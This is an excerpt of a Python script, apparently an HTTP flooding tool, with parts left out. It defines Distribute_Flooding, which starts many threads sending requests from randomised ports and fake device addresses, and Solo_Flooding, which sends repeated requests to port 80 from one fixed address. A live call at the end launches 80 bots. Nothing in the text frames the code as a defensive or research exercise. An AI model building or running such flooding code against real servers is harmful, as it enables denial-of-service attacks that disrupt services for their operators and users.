...
class HTTP_Request(object):
    def __init__(self, port, dev_addr):
        ...
        self.gwalti = '0'
        self.createdTime = str('2016-11-02%2000%3A00%3A00')
...
def Distribute_Flooding(bot):
    port = randint(0, 65535)
    for i in range(bot):
        dev_addr = ''
        for i in range(8):
            dev_addr += choice(string.ascii_letters + string.digits)
        threading.Thread(target=HTTP_Request(port, dev_addr).Message_Simulation, args=(100000, 0)).start()

def Solo_Flooding(bot):
    for i in range(bot):
        threading.Thread(target=HTTP_Request('80', '7CA100207CA10020dd123').Message_Simulation, args=(100000, 0)).start()

Distribute_Flooding(bot=80)
#Solo_Flooding(bot=50)
